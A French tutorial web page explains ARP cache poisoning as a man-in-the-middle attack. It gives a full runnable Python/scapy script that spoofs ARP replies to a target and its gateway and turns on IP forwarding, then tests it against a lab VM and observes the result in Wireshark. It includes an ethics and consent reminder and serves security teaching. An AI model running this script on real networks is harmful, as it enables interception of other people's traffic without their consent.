
<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1"/>

    <title>MONs de Thibault</title>

    <link href=/do-it/assets/node_modules/prismjs/themes/prism-solarizedlight.min.css rel="stylesheet">
    <link href=/do-it/assets/node_modules/prismjs/plugins/line-numbers/prism-line-numbers.min.css rel="stylesheet">

    <link href=/do-it/assets/stylesheets/main.css rel="stylesheet">
  </head>
  <body>
    <script>
      window.MathJax = {
        tex: {
          inlineMath: [
            [
              '$', '$'
            ],
            [
              '\\(', '\\)'
            ]
          ]
        },
        svg: {
          fontCache: 'global'
        }
      };
    </script>
    <script type="text/javascript" id="MathJax-script" 
  src=/do-it/assets/node_modules/mathjax/es5/tex-svg-full.js></script>

    <header class="border-b-2 border-gray-200 mb-4">
      <div class="max-w-[1000px] mx-auto px-4">
        <div class="min-h-[50px] flex justify-between items-center">
          <a class="mx-2" href="/do-it/">Home</a>
          <a class="mx-2" href="/do-it/about">About</a>
        </div>
      </div>
    </header>

    <main class="max-w-[1000px] mx-auto px-4">

      
<article>
  <h1  class="mb-1">MONs de Thibault</h1>
  <div class="mb-4">
    
      <div class=" px-4 flex items-center">
        
          <div class="font-bold">Tags : </div>
        
        <ul class="flex not-prose list-none my-0 last:after:content-['•'] last:after:px-1 mx-0 px-1">
          
            <li class="before:content-['•'] before:px-1">arp</li>
          
            <li class="before:content-['•'] before:px-1">arp spoofing</li>
          
            <li class="before:content-['•'] before:px-1">arp poisoning</li>
          
            <li class="before:content-['•'] before:px-1">wifi</li>
          
            <li class="before:content-['•'] before:px-1">securite informatique</li>
          
        </ul>
      </div>
    

    
      <div class=" px-4 flex items-center">
        
          <div class="font-bold">Auteur : </div>
        
        <ul class="flex not-prose list-none my-0 last:after:content-['•'] last:after:px-1 mx-0 px-1">
          
            <li class="before:content-['•'] before:px-1">Thibault Adelain</li>
          
        </ul>
      </div>
    
  </div>

  

  <!-- début résumé -->
<ul>
<li>ARP spoofing : attaque sur un réseau wifi</li>
<li>Niveau : intermédiaire</li>
</ul>
<p>Rappel : Il faut avoir l'accord de la personne cible et de l'administrateur réseau pour réaliser un ARP spoofing. Il faut s'en tenir à des pratiques éthiques et de ne pas utiliser ses connaissances pour causer des dommages ou enfreindre la loi.</p>
<h2>ARP spoofing : un type d'attaque MITM</h2>
<p>L'ARP spoofing (ARP poisoning, ARP cache poisoning) est une attaque de type <em>Man In The Middle</em> (MITM). Sur un réseau local (LAN), le but de ce type d'attaque est de se placer entre la cible et le router. Ainsi, toutes les requêtes envoyées par la cible pour accéder à internet (qui transite normalement par le router), passeront à la machine de l'attaquant. Souvent, l'attaquant redirige ensuite le trafic vers le router qui envoie les requête de l'utilisateur sur internet. L'attaquant agit comme un intermédiaire, et peut alors espionner tout le trafic réseau de la machine cible.</p>
<p><img src="man-in-the-middle-attack.jpg" alt="man in the middle"></p>
<p>En particulier, l'ARP cache poisoning consiste à utiliser une faille du protocole ARP afin se faire passer pour le router auprès de la machine cible.</p>
<h2>ARP spoofing : protocole ARP</h2>
<h3>Définition</h3>
<p>ARP (Address Resolution Protocol) est un protocole utilisé pour résoudre les adresses IP en adresses MAC (Media Access Control) dans les réseaux locaux. En effet, dans un réseau local les machines communiquent entre elles en utilisant les adresses MAC, et non les adresses IP. Pourquoi cela ? Pour plusieurs raisons en fait.</p>
<p>Les adresses MAC sont plus efficaces et plus fiables que les adresses IP : les adresses MAC sont des adresses physiques, qui sont uniques et qui ne changent pas, contrairement aux adresses IP qui peuvent être dynamiques et qui peuvent changer (cf le protocole <a href="https://fr.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol">DHCP</a>). Les adresses MAC sont stockées sur les puces réseau des appareils et sont utilisées pour communiquer au niveau de la couche 2 (couche liaison de données) du modèle OSI. Donc en utilisant l'adresse MAC pour communiquer, les machines évitent les problèmes de résolution d'adresses qui peuvent se produire lorsque les adresses IP sont dynamiques ou lorsque des appareils sont déplacés d'un sous-réseau à un autre.</p>
<p>De plus, L'utilisation des adresses MAC permet aux machines de communiquer directement entre elles sur le réseau local sans avoir à passer par un serveur de résolution d'adresses ou un routeur pour déterminer l'adresse physique de la machine destinataire. Cela permet de réduire la charge sur les routeurs et les serveurs, et d'éviter de surcharger le réseau.</p>
<h3>Étapes de communication</h3>
<p>Lorsque vous envoyez un paquet à une machine, il faut d'abord résoudre son adresse MAC.</p>
<p>Pour résoudre une adresse MAC d'un autre appareil sur le même réseau local, une machine envoie des requêtes ARP en broadcast (à toutes les machines du réseau) et demande : &quot;A qui correspond l'adresse IP 192.168.0.13 ? Dites le à 192.168.0.1&quot;, et la machine ayant cette adresse répond : &quot;À moi, 192.168.0.13, voici mon adresse MAC : 5E:FF:56:A2:AF:15&quot;.</p>
<p><img src="wireshark_arp.png" alt="Wireshark Capture of ARP request/ reply"></p>
<p>Ensuite, son adresse mac est enregistré dans votre table ARP, contenant toutes les adresses IP et adresses MAC connues. Par exemple :</p>
<table>
<thead>
<tr>
<th style="text-align:center">IP address</th>
<th style="text-align:center">MAC address</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">192.168.0.1</td>
<td style="text-align:center">2E:A0:12:B2:A6:87</td>
</tr>
<tr>
<td style="text-align:center">192.168.0.13</td>
<td style="text-align:center">5E:FF:56:A2:AF:15</td>
</tr>
<tr>
<td style="text-align:center">192.168.0.15</td>
<td style="text-align:center">6C:A4:36:B7:D6:31</td>
</tr>
</tbody>
</table>
<p>Ainsi, à chaque nouvelle requête à cette IP, plus besoin de faire de requête ARP pour résoudre son adresse MAC.</p>
<p>Dans votre terminal :</p>
<pre class="language-bash " style="counter-reset: linenumber 0"><code class="language-bash"><span class="token comment"># Pour visualisez votre table ARP :</span>
arp <span class="token parameter variable">-a</span>
</code></pre>
<h3>Faiblesse du protocole</h3>
<p>La principale faiblesse du protocole ARP est l'absence de vérification d'authenticité : les paquets ARP ne sont pas chiffrés et ne contiennent pas de mécanisme d'authentification, ce qui signifie qu'ils peuvent être facilement falsifiés.</p>
<h2>ARP spoofing : exploitation (ARP cache poisoning)</h2>
<h3>Concept</h3>
<p>On considère  192.168.0.1 comme le router, 192.168.0.13 comme la machine cible, 192.168.0.15 comme l'attaquant.</p>
<p>On peut donc envoyer un requête ARP à la machine cible. Requête ARP vers la machine cible : &quot;l'adresse IP : 192.168.0.1 correspond à l'adresse MAC : 6C:A4:36:B7:D6:31&quot;. C'est le principe de l'attaque ARP cache poisoning. Dans la table ARP de la machine cible, on vient de modifier l'entrée du router (192.168.0.1) et de remplacer l'adresse MAC du router par l'adresse MAC (6C:A4:36:B7:D6:31) de l'attaquant. On va faire la même chose pour le router, pour que toutes les requêtes du router vers la machine cible transitent par l'attaquant. Requête ARP vers le router : &quot;l'adresse IP : 192.168.0.13 correspond à l'adresse MAC : 6C:A4:36:B7:D6:31&quot;.</p>
<p><img src="schema_arp_spoofing.png" alt="ARP spoofing"><br>
Photo par <a href="https://levelup.gitconnected.com/man-in-the-middle-attack-part-1-arp-spoofing-6f5b174dec59">Dharmil Chhadva</a>.</p>
<h3>Implémentation</h3>
<p><strong>Note</strong> : macOS possède une fonctionnalité intégrée appelée &quot;ARP cache validation&quot; qui vise à protéger contre les attaques d'ARP spoofing en vérifiant la validité des entrées dans la table ARP. Cette attaque n'a pas fonctionné sur mes appareils macOS / iOS. Cependant, elle a fonctionné sur des windows / Linux.</p>
<p>On va utiliser Python et la bibliothèque <a href="https://scapy.net/">scapy</a> qui permet de manipuler les paquets.</p>
<p>On va d'abord créer une fonction qui renvoie l'adresse MAC de l'IP demandé. Cela se fait en envoyant des paquets ARP en broadcast (ff:ff:ff:ff:ff:ff).</p>
<pre class="language-python " style="counter-reset: linenumber 0"><code class="language-python"><span class="token keyword">import</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">as</span> scapy
<span class="token keyword">import</span> time
<span class="token keyword">import</span> argparse

<span class="token keyword">def</span> <span class="token function">get_mac</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
    arp_req_frame <span class="token operator">=</span> scapy<span class="token punctuation">.</span>ARP<span class="token punctuation">(</span>pdst <span class="token operator">=</span> ip<span class="token punctuation">)</span>
    broadcast_ether_frame <span class="token operator">=</span> scapy<span class="token punctuation">.</span>Ether<span class="token punctuation">(</span>dst <span class="token operator">=</span> <span class="token string">"ff:ff:ff:ff:ff:ff"</span><span class="token punctuation">)</span>
    broadcast_ether_arp_req_frame <span class="token operator">=</span> broadcast_ether_frame <span class="token operator">/</span> arp_req_frame
    answered_list <span class="token operator">=</span> scapy<span class="token punctuation">.</span>srp<span class="token punctuation">(</span>broadcast_ether_arp_req_frame<span class="token punctuation">,</span> timeout <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> verbose <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> answered_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>hwsrc
</code></pre>
<p>Grâce à la fonction spoof, on envoie un packet ARP qui va changer le cache ARP de machine cible. En effet, <code>scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)</code> permet d'envoyer un paquet à la machine ayant l'IP <code>target_ip</code> et de remplacer, dans sa table ARP à la ligne <code>spoof_ip</code>, l'adresse mac réel par notre adresse MAC.</p>
<pre class="language-python " style="counter-reset: linenumber 0"><code class="language-python"><span class="token comment"># Our mac address is sent automatically in an ARP packet, so we don't need to precise hwsrc=our_mac in scapy.ARP</span>
<span class="token keyword">def</span> <span class="token function">spoof</span><span class="token punctuation">(</span>target_ip<span class="token punctuation">,</span> spoof_ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
    target_mac <span class="token operator">=</span> get_mac<span class="token punctuation">(</span>target_ip<span class="token punctuation">)</span>
    spoof_packet <span class="token operator">=</span> scapy<span class="token punctuation">.</span>ARP<span class="token punctuation">(</span>op <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> pdst <span class="token operator">=</span> target_ip<span class="token punctuation">,</span> hwdst <span class="token operator">=</span> target_mac<span class="token punctuation">,</span> psrc <span class="token operator">=</span> spoof_ip<span class="token punctuation">)</span>
    scapy<span class="token punctuation">.</span>send<span class="token punctuation">(</span>spoof_packet<span class="token punctuation">,</span> verbose <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>
</code></pre>
<p>On fait une fonction restore pour rétablir les tables ARP initiales après avoir fini le spoofing.</p>
<pre class="language-python " style="counter-reset: linenumber 0"><code class="language-python"><span class="token keyword">def</span> <span class="token function">restore</span><span class="token punctuation">(</span>source_ip<span class="token punctuation">,</span> destination_ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
    source_mac <span class="token operator">=</span> get_mac<span class="token punctuation">(</span>source_ip<span class="token punctuation">)</span>
    destination_mac <span class="token operator">=</span> get_mac<span class="token punctuation">(</span>destination_ip<span class="token punctuation">)</span>
    restore_packet <span class="token operator">=</span> scapy<span class="token punctuation">.</span>ARP<span class="token punctuation">(</span>op <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> pdst <span class="token operator">=</span> destination_ip<span class="token punctuation">,</span> hwdst <span class="token operator">=</span> destination_mac<span class="token punctuation">,</span> psrc <span class="token operator">=</span> source_ip<span class="token punctuation">,</span> hwsrc <span class="token operator">=</span> source_mac<span class="token punctuation">)</span>
    scapy<span class="token punctuation">.</span>send<span class="token punctuation">(</span>restore_packet<span class="token punctuation">,</span> count <span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> verbose <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>
</code></pre>
<p>On ajoute argparse pour pouvoir parser des arguments en ligne de commande et on fait la boucle permettant de lancer l'ARP cache poisoning. <code>target_ip</code> correspond à l'IP de la machine cible et <code>gateway_ip</code> correspond à l'IP du router.</p>
<p>Le code entier donne :</p>
<pre class="language-python " style="counter-reset: linenumber 0"><code class="language-python"><span class="token keyword">import</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">as</span> scapy
<span class="token keyword">import</span> time
<span class="token keyword">import</span> argparse

<span class="token keyword">def</span> <span class="token function">get_args</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"-t"</span><span class="token punctuation">,</span> <span class="token string">"--target"</span><span class="token punctuation">,</span> dest <span class="token operator">=</span> <span class="token string">"target_ip"</span><span class="token punctuation">,</span> <span class="token builtin">help</span> <span class="token operator">=</span> <span class="token string">"IP Address of the target."</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"--gateway"</span><span class="token punctuation">,</span> dest <span class="token operator">=</span> <span class="token string">"gateway_ip"</span><span class="token punctuation">,</span> <span class="token builtin">help</span> <span class="token operator">=</span> <span class="token string">"IP Address of the Gateway."</span><span class="token punctuation">)</span>
    options <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> options<span class="token punctuation">.</span>target_ip<span class="token punctuation">:</span>
        <span class="token comment">#Code to handle if an IP Address of the target is not specified.</span>
        parser<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">"[-] Please specify an IP Address of the target machine, use --help for more info."</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> <span class="token keyword">not</span> options<span class="token punctuation">.</span>gateway_ip<span class="token punctuation">:</span>
        <span class="token comment">#Code to handle if an IP Address of the gateway is not specified.</span>
        parser<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">"[-] Please specify an IP Address of the gateway, use --help for more info."</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> options

<span class="token keyword">def</span> <span class="token function">get_mac</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
    arp_req_frame <span class="token operator">=</span> scapy<span class="token punctuation">.</span>ARP<span class="token punctuation">(</span>pdst <span class="token operator">=</span> ip<span class="token punctuation">)</span>
    broadcast_ether_frame <span class="token operator">=</span> scapy<span class="token punctuation">.</span>Ether<span class="token punctuation">(</span>dst <span class="token operator">=</span> <span class="token string">"ff:ff:ff:ff:ff:ff"</span><span class="token punctuation">)</span>
    broadcast_ether_arp_req_frame <span class="token operator">=</span> broadcast_ether_frame <span class="token operator">/</span> arp_req_frame
    answered_list <span class="token operator">=</span> scapy<span class="token punctuation">.</span>srp<span class="token punctuation">(</span>broadcast_ether_arp_req_frame<span class="token punctuation">,</span> timeout <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> verbose <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> answered_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>hwsrc

<span class="token keyword">def</span> <span class="token function">spoof</span><span class="token punctuation">(</span>target_ip<span class="token punctuation">,</span> spoof_ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
    target_mac <span class="token operator">=</span> get_mac<span class="token punctuation">(</span>target_ip<span class="token punctuation">)</span>
    spoof_packet <span class="token operator">=</span> scapy<span class="token punctuation">.</span>ARP<span class="token punctuation">(</span>op <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> pdst <span class="token operator">=</span> target_ip<span class="token punctuation">,</span> hwdst <span class="token operator">=</span> target_mac<span class="token punctuation">,</span> psrc <span class="token operator">=</span> spoof_ip<span class="token punctuation">)</span>
    scapy<span class="token punctuation">.</span>send<span class="token punctuation">(</span>spoof_packet<span class="token punctuation">,</span> verbose <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>
    
<span class="token keyword">def</span> <span class="token function">restore</span><span class="token punctuation">(</span>source_ip<span class="token punctuation">,</span> destination_ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
    source_mac <span class="token operator">=</span> get_mac<span class="token punctuation">(</span>source_ip<span class="token punctuation">)</span>
    destination_mac <span class="token operator">=</span> get_mac<span class="token punctuation">(</span>destination_ip<span class="token punctuation">)</span>
    restore_packet <span class="token operator">=</span> scapy<span class="token punctuation">.</span>ARP<span class="token punctuation">(</span>op <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> pdst <span class="token operator">=</span> destination_ip<span class="token punctuation">,</span> hwdst <span class="token operator">=</span> destination_mac<span class="token punctuation">,</span> psrc <span class="token operator">=</span> source_ip<span class="token punctuation">,</span> hwsrc <span class="token operator">=</span> source_mac<span class="token punctuation">)</span>
    scapy<span class="token punctuation">.</span>send<span class="token punctuation">(</span>restore_packet<span class="token punctuation">,</span> count <span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> verbose <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>
  
packets_sent <span class="token operator">=</span> <span class="token number">0</span>

options <span class="token operator">=</span> get_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
target_ip <span class="token operator">=</span> options<span class="token punctuation">.</span>target_ip
gateway_ip <span class="token operator">=</span> options<span class="token punctuation">.</span>gateway_ip

<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        spoof<span class="token punctuation">(</span>target_ip<span class="token punctuation">,</span> gateway_ip<span class="token punctuation">)</span>
        spoof<span class="token punctuation">(</span>gateway_ip<span class="token punctuation">,</span> target_ip<span class="token punctuation">)</span>
        packets_sent <span class="token operator">+=</span> <span class="token number">2</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r[+] Packets Sent: {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>packets_sent<span class="token punctuation">)</span><span class="token punctuation">,</span> end <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
        
<span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[-] Detected Ctrl + C..... Restoring the ARP Tables..... Be Patient"</span><span class="token punctuation">)</span>
    restore<span class="token punctuation">(</span>target_ip<span class="token punctuation">,</span> gateway_ip<span class="token punctuation">)</span>
    restore<span class="token punctuation">(</span>gateway_ip<span class="token punctuation">,</span> target_ip<span class="token punctuation">)</span>
</code></pre>
<h3>Tests et finitions</h3>
<p>Tester seulement sur des appareils et des réseaux wifi dont vous avez l'autorisation. ARP spoofing est certes intrusif sur l'appareil cible, mais peut aussi saturer le réseau local. Également, vous pouvez activer des systèmes de détection d'intrusion.</p>
<p>Pour le test, nous allons utiliser une machine virtuel comme appareil cible. Vous pouvez aussi utliser l'appareil de votre choix. Je vous renvoie au MON <a href="../pentest">pentest</a> pour voir comment set-up la VM (utiliser l'OS de votre choix). Il faut par contre configurer le réseau sur <em>connection par pont</em> (cliquez sur une VM puis --&gt; config --&gt; réseau --&gt; accès par pont).</p>
<p>On peut regarder les tables ARP sur nos machines (attaquant et cible) avec <code>arp -a</code>. Sur la machine cible :</p>
<table>
<thead>
<tr>
<th style="text-align:center">IP address</th>
<th style="text-align:center">MAC address</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">192.168.0.1</td>
<td style="text-align:center">2E:A0:12:B2:A6:87</td>
</tr>
<tr>
<td style="text-align:center">192.168.0.13</td>
<td style="text-align:center">5E:FF:56:A2:AF:15</td>
</tr>
<tr>
<td style="text-align:center">192.168.0.15</td>
<td style="text-align:center">6C:A4:36:B7:D6:31</td>
</tr>
</tbody>
</table>
<p>Lancer la commande suivante pour lancer l'arp spoofing (-t : target ; -g : gateway) :</p>
<pre class="language-python " style="counter-reset: linenumber 0"><code class="language-python">python3 arp_MITM<span class="token punctuation">.</span>py <span class="token operator">-</span>t <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.13</span> <span class="token operator">-</span>g <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.1</span>
</code></pre>
<p>Si tout se passe bien, les packets sont transmis. En refaisant la commande <code>arp -a</code> sur la VM cible:</p>
<table>
<thead>
<tr>
<th style="text-align:center">IP address</th>
<th style="text-align:center">MAC address</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">192.168.0.1</td>
<td style="text-align:center">6C:A4:36:B7:D6:31</td>
</tr>
<tr>
<td style="text-align:center">192.168.0.13</td>
<td style="text-align:center">5E:FF:56:A2:AF:15</td>
</tr>
<tr>
<td style="text-align:center">192.168.0.15</td>
<td style="text-align:center">6C:A4:36:B7:D6:31</td>
</tr>
</tbody>
</table>
<p>Voilà, maintenant tous les paquets provenant de la machine cible passent par l'attaquant. On peut utiliser des outils de sniffing de paquets pour espionner les paquets de l'utilisateur. On pourra voir toutes les ressources auxquelles il accède, et si les paquets ne sont pas chiffrés, on peut voir les données qui transitent.</p>
<p>En utilisant wireshark, on voit que la victime essaye de se connecter au serveur DNS de google (8.8.8.8)  : <img src="wireshark_spoof.png" alt="wireshark_ICMP_no_response"></p>
<p>On voit que les paquets ICMP de la victime n'ont pas de réponse. A ce stade, tous les paquets de la cible passent par l'attaquant. Mais l'attaquant ne fait rien de ses paquets : il faut rediriger ces paquets vers internet, et que tous les paquets à destination de la cible lui parviennent en retour. L'attaque sera alors réussi.</p>
<p>On rajoute les modules os et signal, le paramètre <code>scapy.conf.iface = &quot;en0&quot;</code> (dépendant de votre configuration par pont, à voir dans VMware), dans le try les instructions pour autoriser le port forwarding, et dans le except les instructions pour retourner à l'état initial. Voici le fichier final :</p>
<pre class="language-python " style="counter-reset: linenumber 0"><code class="language-python"><span class="token keyword">import</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">as</span> scapy
<span class="token keyword">import</span> time
<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> os
<span class="token keyword">import</span> signal

<span class="token keyword">def</span> <span class="token function">get_args</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"-t"</span><span class="token punctuation">,</span> <span class="token string">"--target"</span><span class="token punctuation">,</span> dest <span class="token operator">=</span> <span class="token string">"target_ip"</span><span class="token punctuation">,</span> <span class="token builtin">help</span> <span class="token operator">=</span> <span class="token string">"IP Address of the target."</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"--gateway"</span><span class="token punctuation">,</span> dest <span class="token operator">=</span> <span class="token string">"gateway_ip"</span><span class="token punctuation">,</span> <span class="token builtin">help</span> <span class="token operator">=</span> <span class="token string">"IP Address of the Gateway."</span><span class="token punctuation">)</span>
    options <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> options<span class="token punctuation">.</span>target_ip<span class="token punctuation">:</span>
        <span class="token comment">#Code to handle if an IP Address of the target is not specified.</span>
        parser<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">"[-] Please specify an IP Address of the target machine, use --help for more info."</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> <span class="token keyword">not</span> options<span class="token punctuation">.</span>gateway_ip<span class="token punctuation">:</span>
        <span class="token comment">#Code to handle if an IP Address of the gateway is not specified.</span>
        parser<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">"[-] Please specify an IP Address of the gateway, use --help for more info."</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> options

<span class="token keyword">def</span> <span class="token function">get_mac</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
    arp_req_frame <span class="token operator">=</span> scapy<span class="token punctuation">.</span>ARP<span class="token punctuation">(</span>pdst <span class="token operator">=</span> ip<span class="token punctuation">)</span>
    broadcast_ether_frame <span class="token operator">=</span> scapy<span class="token punctuation">.</span>Ether<span class="token punctuation">(</span>dst <span class="token operator">=</span> <span class="token string">"ff:ff:ff:ff:ff:ff"</span><span class="token punctuation">)</span>
    broadcast_ether_arp_req_frame <span class="token operator">=</span> broadcast_ether_frame <span class="token operator">/</span> arp_req_frame
    answered_list <span class="token operator">=</span> scapy<span class="token punctuation">.</span>srp<span class="token punctuation">(</span>broadcast_ether_arp_req_frame<span class="token punctuation">,</span> timeout <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> verbose <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> answered_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>hwsrc
  
<span class="token keyword">def</span> <span class="token function">spoof</span><span class="token punctuation">(</span>target_ip<span class="token punctuation">,</span> spoof_ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
    target_mac <span class="token operator">=</span> get_mac<span class="token punctuation">(</span>target_ip<span class="token punctuation">)</span>
    spoof_packet <span class="token operator">=</span> scapy<span class="token punctuation">.</span>ARP<span class="token punctuation">(</span>op <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> pdst <span class="token operator">=</span> target_ip<span class="token punctuation">,</span> hwdst <span class="token operator">=</span> target_mac<span class="token punctuation">,</span> psrc <span class="token operator">=</span> spoof_ip<span class="token punctuation">)</span>
    scapy<span class="token punctuation">.</span>send<span class="token punctuation">(</span>spoof_packet<span class="token punctuation">,</span> verbose <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>
    
<span class="token keyword">def</span> <span class="token function">restore</span><span class="token punctuation">(</span>source_ip<span class="token punctuation">,</span> destination_ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
    source_mac <span class="token operator">=</span> get_mac<span class="token punctuation">(</span>source_ip<span class="token punctuation">)</span>
    destination_mac <span class="token operator">=</span> get_mac<span class="token punctuation">(</span>destination_ip<span class="token punctuation">)</span>
    restore_packet <span class="token operator">=</span> scapy<span class="token punctuation">.</span>ARP<span class="token punctuation">(</span>op <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> pdst <span class="token operator">=</span> destination_ip<span class="token punctuation">,</span> hwdst <span class="token operator">=</span> destination_mac<span class="token punctuation">,</span> psrc <span class="token operator">=</span> source_ip<span class="token punctuation">,</span> hwsrc <span class="token operator">=</span> source_mac<span class="token punctuation">)</span>
    scapy<span class="token punctuation">.</span>send<span class="token punctuation">(</span>restore_packet<span class="token punctuation">,</span> count <span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> verbose <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span>
  
packets_sent <span class="token operator">=</span> <span class="token number">0</span>

options <span class="token operator">=</span> get_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
target_ip <span class="token operator">=</span> options<span class="token punctuation">.</span>target_ip
gateway_ip <span class="token operator">=</span> options<span class="token punctuation">.</span>gateway_ip
scapy<span class="token punctuation">.</span>conf<span class="token punctuation">.</span>iface <span class="token operator">=</span> <span class="token string">"en0"</span>

<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Enabling IP forwarding"</span><span class="token punctuation">)</span>
    <span class="token comment">#Enable IP Forwarding on a mac</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"sudo sysctl -w net.inet.ip.forwarding=1"</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        spoof<span class="token punctuation">(</span>target_ip<span class="token punctuation">,</span> gateway_ip<span class="token punctuation">)</span>
        spoof<span class="token punctuation">(</span>gateway_ip<span class="token punctuation">,</span> target_ip<span class="token punctuation">)</span>
        packets_sent <span class="token operator">+=</span> <span class="token number">2</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r[+] Packets Sent: {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>packets_sent<span class="token punctuation">)</span><span class="token punctuation">,</span> end <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    
        
<span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[-] Detected Ctrl + C..... Restoring the ARP Tables..... Be Patient"</span><span class="token punctuation">)</span>
    restore<span class="token punctuation">(</span>target_ip<span class="token punctuation">,</span> gateway_ip<span class="token punctuation">)</span>
